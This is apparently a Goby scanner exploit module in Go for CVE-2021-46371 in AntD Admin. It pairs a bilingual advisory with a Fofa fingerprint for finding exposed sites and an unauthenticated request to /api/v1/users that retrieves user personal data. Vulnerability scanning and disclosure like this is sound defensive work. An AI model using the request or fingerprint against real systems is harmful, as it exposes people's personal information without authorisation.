package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "AntD Admin Sensitive users Api Information Disclosure Vulnerability (CVE-2021-46371)",
    "Description": "<p>AntD Admin is an excellent front-end solution for enterprise applications built on Ant Design and UmiJs by individual developers of Zuiidea.</p><p>AntD Admin has a security vulnerability that stems from Antd-admin 5.5.0 being affected by an incorrect access control vulnerability. Attackers can exploit this vulnerability to gain unauthorized access to some front-end interfaces, resulting in the leakage of sensitive information.</p>",
    "Impact": "<p>AntD Admin Sensitive Information Disclosure Vulnerability (CVE-2021-46371)</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the update of the manufacturer's homepage: <a href=\"https://github.com/zuiidea/antd-admin/issues/1127\">https://github.com/zuiidea/antd-admin/issues/1127</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "Product": "AntD Admin",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "AntD Admin users 接口敏感信息泄露漏洞（CVE-2021-46371）",
            "Product": "AntD Admin",
            "Description": "<p>AntD Admin是Zuiidea个人开发者的一个基于 Ant Design 和 UmiJs 构建的企业应用程序的优秀前端解决方案。</p><p>AntD Admin 存在安全漏洞，该漏洞源于Antd-admin 5.5.0受到错误访问控制漏洞的影响。攻击者可利用该漏洞前台部分接口未经授权访问，导致敏感信息泄露。</p>",
            "Recommendation": "<p>1、目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://github.com/zuiidea/antd-admin/issues/1127\">https://github.com/zuiidea/antd-admin/issues/1127</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16.96px;\">Antd-admin 5.5.0 存在信息泄露漏洞，攻击者可利用该漏洞查看用户ID，姓名，年龄，电话号码，地址和其他敏感信息。</span><br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "AntD Admin Sensitive users Api Information Disclosure Vulnerability (CVE-2021-46371)",
            "Product": "AntD Admin",
            "Description": "<p>AntD Admin is an excellent front-end solution for enterprise applications built on Ant Design and UmiJs by individual developers of Zuiidea.</p><p>AntD Admin has a security vulnerability that stems from Antd-admin 5.5.0 being affected by an incorrect access control vulnerability. Attackers can exploit this vulnerability to gain unauthorized access to some front-end interfaces, resulting in the leakage of sensitive information.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the update of the manufacturer's homepage: <a href=\"https://github.com/zuiidea/antd-admin/issues/1127\">https://github.com/zuiidea/antd-admin/issues/1127</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>AntD Admin Sensitive Information Disclosure Vulnerability (CVE-2021-46371)</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"/@@/devScripts.js\" && body=\"//! umi version:\" && body=\"/umi.js\"",
    "GobyQuery": "body=\"/@@/devScripts.js\" && body=\"//! umi version:\" && body=\"/umi.js\"",
    "Author": "vikkieen",
    "Homepage": "https://github.com/zuiidea/antd-admin",
    "DisclosureDate": "2022-02-22",
    "References": [
        "https://github.com/zuiidea/antd-admin/issues/1127"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-46371"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202202-1147"
    ],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/users",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "image.zuiidea.com",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/users",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "image.zuiidea.com",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6979"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
